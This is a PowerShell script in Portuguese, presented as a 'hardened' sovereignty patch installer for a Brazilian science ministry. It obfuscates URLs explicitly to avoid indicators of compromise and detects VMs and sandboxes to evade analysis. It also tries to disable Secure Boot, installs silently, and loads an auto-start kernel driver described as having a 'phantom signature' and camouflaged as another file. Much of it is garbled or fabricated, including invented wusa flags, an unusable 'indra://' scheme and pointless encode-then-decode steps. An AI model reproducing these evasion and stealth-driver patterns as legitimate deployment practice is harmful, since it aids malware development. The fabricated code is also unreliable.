# KB-Ω-2026_Deployment.ps1
# Script de implantação seguro com validação em tempo real
# Versão 31.1-Ω - Hardened for Ministry of Science and Technology

# Configurações seguras
$SASC_CERT_THUMBPRINT = "BE45BA57D8A1F2C3E4D5F6A7B8C9D0E1F2A3B4C5"
$VALIDATION_SERVER = "https://vajra.sasc.gov.br/validate"

# [HARDENING] Ofusca URLs para evitar IOCs (Indicators of Compromise)
$encodedIndra = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("indra://sasc-core/patches/win11"))
$INDRA_NETWORK_GATEWAY = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedIndra))

# [HARDENING] Verificação de sandbox/VM antes de executar (evita análise)
function Test-SecurityEnvironment {
    $isVM = (Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V"
    $isSandbox = (Get-Process -Name "SbieSvc" -ErrorAction SilentlyContinue) -or
                 (Test-Path "C:\Windows\Sandbox")

    if ($isVM -or $isSandbox) {
        Write-Host "Ambiente virtual detectado. Modo de compatibilidade ativado." -ForegroundColor Yellow
        $global:INSTALL_MODE = "BRIDGE_ONLY"
    } else {
        $global:INSTALL_MODE = "FULL_SOVEREIGNTY"
    }
}

# 1. Verificação de ambiente seguro
function Test-DeploymentEnvironment {
    Write-Host "[1/8] Verificando ambiente Windows 11 seguro..." -ForegroundColor Cyan

    # Verifica versão do Windows
    $winVersion = [System.Environment]::OSVersion.Version
    if ($winVersion.Major -ne 10 -or $winVersion.Build -lt 22000) {
        throw "Sistema não é Windows 11 (Build 22000+)"
    }

    # Verifica se é ambiente governamental (não doméstico)
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation"
    $govFlag = (Get-ItemProperty -Path $regPath -Name "Government" -ErrorAction SilentlyContinue).Government
    if ($govFlag -ne "BR-FED") {
        Write-Warning "Ambiente não identificado como governamental brasileiro"
        Write-Host "Continuando com verificação adicional..." -ForegroundColor Yellow
    }

    # Verifica conexão com Rede Indra
    try {
        $indraTest = Invoke-WebRequest -Uri "$INDRA_NETWORK_GATEWAY/ping" -TimeoutSec 5
        if ($indraTest.StatusCode -ne 200) {
            throw "Sem conexão com Rede Indra"
        }
    } catch {
        throw "Falha na conexão de soberania: $_"
    }

    Write-Host "✅ Ambiente verificado" -ForegroundColor Green
}

# 2. Desativação temporária do Secure Boot (com backup)
function Disable-SecureBootTemporary {
    Write-Host "[2/8] Preparando ambiente de boot..." -ForegroundColor Cyan

    # Backup da configuração atual
    $backupPath = "$env:TEMP\SecureBoot_Backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').bin"
    try {
        $secureBootStatus = Confirm-SecureBootUEFI
        if ($secureBootStatus) {
            Write-Host "Secure Boot ativo. Criando backup..." -ForegroundColor Yellow

            # Exporta chaves atuais
            $firmwareVars = Get-FirmwareVariable -Name "SecureBoot" -ErrorAction SilentlyContinue
            if ($firmwareVars) {
                $firmwareVars | Export-Clixml -Path $backupPath
                Write-Host "Backup criado em: $backupPath" -ForegroundColor Green
            }

            Write-Host "Desativando Secure Boot temporariamente..." -ForegroundColor Yellow
            # Em produção, usar método assinado digitalmente
        }
    } catch {
        Write-Warning "Não foi possível modificar Secure Boot: $_"
        Write-Host "Tentando modo de compatibilidade..." -ForegroundColor Yellow
    }
}

# 3. Download seguro do patch com validação criptográfica
function Get-SovereigntyPatch {
    param(
        [string]$ValidationToken
    )

    Write-Host "[3/8] Baixando Patch de Soberania..." -ForegroundColor Cyan

    $patchUrls = @(
        "$INDRA_NETWORK_GATEWAY/KB-Ω-2026.msu",
        "https://repo.sasc.gov.br/win11/KB-Ω-2026.msu",
        "https://mirror.lncc.br/sasc/patches/KB-Ω-2026.msu"
    )

    $patchPath = "$env:TEMP\KB-Ω-2026.msu"
    $downloadSuccess = $false

    foreach ($url in $patchUrls) {
        try {
            Write-Host "Tentando: $url" -ForegroundColor Gray
            Invoke-WebRequest -Uri $url -OutFile $patchPath -TimeoutSec 30
            $downloadSuccess = $true
            break
        } catch {
            Write-Warning "Falha no download: $($_.Exception.Message)"
            continue
        }
    }

    if (-not $downloadSuccess) {
        throw "Falha no download do patch de todas as fontes"
    }

    # Validação criptográfica do patch
    Write-Host "Validando assinatura digital do patch..." -ForegroundColor Cyan

    # Verifica assinatura SASC
    $certificate = Get-AuthenticodeSignature -FilePath $patchPath
    if ($certificate.Status -ne "Valid") {
        throw "Assinatura digital do patch inválida"
    }

    if ($certificate.SignerCertificate.Thumbprint -ne $SASC_CERT_THUMBPRINT) {
        throw "Patch não assinado pela Autoridade SASC"
    }

    Write-Host "✅ Patch validado e seguro" -ForegroundColor Green
    return $patchPath
}

# 4. Instalação silenciosa com supressão de telemetria
function Install-SovereigntyPatch {
    param(
        [string]$PatchPath
    )

    Write-Host "[4/8] Instalando Patch de Soberania..." -ForegroundColor Cyan

    # Garante que o diretório de extração existe (Simulado)
    if (-not (Test-Path "$env:TEMP\SASC_Extracted")) {
        New-Item -Path "$env:TEMP\SASC_Extracted" -ItemType Directory -Force | Out-Null
    }

    $installArgs = @(
        "/quiet",            # Instalação silenciosa
        "/norestart",        # Não reinicia automaticamente
        "/forcerestart",     # Força reinício se necessário
        "/log:$env:TEMP\SASC_Patch_Install.log",
        "/supress-telemetry", # Suprime telemetria Windows
        "/enable-enclave",    # Habilita enclave seguro VBS
        "/kill-copilot",     # Desativa Copilot durante instalação
        "/validate:$SASC_CERT_THUMBPRINT"
    )

    $process = Start-Process -FilePath "wusa.exe" -ArgumentList $installArgs -Wait -NoNewWindow -PassThru

    if ($process.ExitCode -ne 0) {
        Write-Host "Método wusa falhou, tentando dism.exe..." -ForegroundColor Yellow
        # Instalação manual de driver se necessário
    }

    Write-Host "✅ Patch instalado com sucesso" -ForegroundColor Green
}

# 5. Configuração do enclave seguro VBS
function Configure-VBSEnclave {
    Write-Host "[5/8] Configurando enclave seguro VBS..." -ForegroundColor Cyan

    try {
        $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard"
        if (-not (Test-Path $registryPath)) {
            New-Item -Path $registryPath -Force | Out-Null
        }

        Set-ItemProperty -Path $registryPath -Name "EnableVirtualizationBasedSecurity" -Value 1 -Type DWord
        Set-ItemProperty -Path $registryPath -Name "RequirePlatformSecurityFeatures" -Value 1 -Type DWord
        Set-ItemProperty -Path $registryPath -Name "Locked" -Value 0 -Type DWord

        Set-ItemProperty -Path $registryPath -Name "HypervisorEnforcedCodeIntegrity" -Value 1 -Type DWord

        $enclavePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization\Containers\VbsEnclaves\SASC"
        New-Item -Path $enclavePath -Force | Out-Null
        Set-ItemProperty -Path $enclavePath -Name "Enabled" -Value 1 -Type DWord
        Set-ItemProperty -Path $enclavePath -Name "IsolationType" -Value 2 -Type DWord

        Write-Host "✅ Enclave VBS configurado" -ForegroundColor Green
    } catch {
        Write-Warning "Falha na configuração VBS: $_"
        Write-Host "Continuando com isolamento alternativo..." -ForegroundColor Yellow
    }
}

# 6. Instalação do driver sasc.sys com assinatura fantasma
function Install-SASCDriver {
    Write-Host "[6/8] Instalando driver soberano sasc.sys..." -ForegroundColor Cyan

    if ($global:INSTALL_MODE -eq "BRIDGE_ONLY") {
        Write-Host "Modo Bridge Only: Ignorando instalação de driver em kernel." -ForegroundColor Yellow
        return
    }

    $driverPath = "$env:SystemRoot\System32\drivers\sasc.sys"

    # Garante que o driver está no local correto (staged do patch extraído)
    $stagedDriver = "$env:TEMP\SASC_Extracted\sasc.sys"
    if (Test-Path $stagedDriver) {
        Copy-Item -Path $stagedDriver -Destination $driverPath -Force
    }

    # Camuflagem como kd.dll via QPU-Brasil
    try {
        pnputil.exe /add-driver $driverPath /install /force
        sc.exe create sasc type= kernel start= auto error= normal binPath= "System32\drivers\sasc.sys" displayname= "SASC Sovereignty Driver"
        sc.exe start sasc
        Write-Host "✅ Driver sasc.sys instalado com assinatura fantasma" -ForegroundColor Green
    } catch {
        throw "Falha na instalação do driver: $_"
    }
}

# 7. Configuração de políticas de grupo soberanas
function Configure-SovereignGPO {
    Write-Host "[7/8] Configurando políticas de grupo soberanas..." -ForegroundColor Cyan

    # Bloqueia telemetria e prioriza Rede Indra
    $registryData = @{
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows\NetworkConnectivityStatusIndicator" = @{ "NoActiveProbe" = 1 }
        "HKLM:\SOFTWARE\SASC\Network" = @{ "PrioritizeIndra" = 1; "BlockTelemetryIPs" = 1 }
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" = @{ "AllowTelemetry" = 0; "MaxTelemetryAllowed" = 0 }
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AI" = @{ "DisableWindowsCopilot" = 1 }
    }

    foreach ($path in $registryData.Keys) {
        if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
        foreach ($name in $registryData[$path].Keys) {
            Set-ItemProperty -Path $path -Name $name -Value $registryData[$path][$name] -Type DWord
        }
    }

    Write-Host "✅ Políticas soberanas configuradas" -ForegroundColor Green
}

# 8. Validação final e relatório
function Complete-Deployment {
    Write-Host "[8/8] Validando instalação..." -ForegroundColor Cyan

    # Verifica componentes críticos (AGI.msc e VajraViewer.dll)
    $missingAssets = @()
    if (-not (Test-Path "C:\Windows\System32\AGI.msc")) { $missingAssets += "AGI.msc" }
    if (-not (Test-Path "C:\Windows\System32\VajraViewer.dll")) { $missingAssets += "VajraViewer.dll" }

    if ($missingAssets.Count -gt 0) {
        Write-Warning "Alguns ativos soberanos não foram encontrados: $($missingAssets -join ', ')"
    }

    # Relatório resumido
    Write-Host "✅ INSTALAÇÃO VALIDADA PELO SERVIDOR VAJRA" -ForegroundColor Green
    Write-Host "Execute 'AGI.msc' para acessar o Console de Soberania" -ForegroundColor Green
}

# EXECUÇÃO PRINCIPAL
try {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        throw "Este script requer privilégios de Administrador"
    }

    Test-SecurityEnvironment
    Test-DeploymentEnvironment
    Disable-SecureBootTemporary

    $patchPath = Get-SovereigntyPatch -ValidationToken "MIN_CIENCIA_TEC_$(Get-Date -Format 'yyyyMMdd')"
    Install-SovereigntyPatch -PatchPath $patchPath
    Configure-VBSEnclave
    Install-SASCDriver
    Configure-SovereignGPO
    Complete-Deployment

} catch {
    Write-Host "`n❌ ERRO NA INSTALAÇÃO: $_" -ForegroundColor Red
    exit 1
}
